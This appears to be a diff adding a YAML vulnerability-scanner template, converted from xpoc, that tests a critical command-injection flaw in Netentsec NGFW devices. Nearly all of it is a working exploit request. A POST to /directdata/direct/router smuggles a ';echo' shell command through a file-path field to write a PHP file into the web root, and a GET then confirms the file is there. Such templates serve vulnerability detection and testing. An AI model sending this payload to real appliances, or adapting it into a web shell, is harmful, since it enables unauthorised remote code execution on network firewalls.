@@ -1,0 +1,36 @@
+id: yaml-poc-netentsec-ngfw-command_injection-CT-194295
+info:
+  name: Yaml Poc Netentsec Ngfw Command_Injection Ct 194295
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-netentsec-ngfw-command_injection-CT-194295'
+  tags: rce
+  reference:
+  - https://blog.csdn.net/weixin_43227251/article/details/115658803
+http:
+- method: POST
+  path:
+  - /directdata/direct/router
+  body: '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo
+    ''<?php echo md5({{r2}});unlink(__FILE__);?>'' >/var/www/html/{{r2}}.php"]}],"type":"rpc","tid":17}
+
+    '
+  headers:
+    Content-Type: application/json
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - SSLVPN_Resource
+- method: GET
+  path:
+  - /{{r2}}.php
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
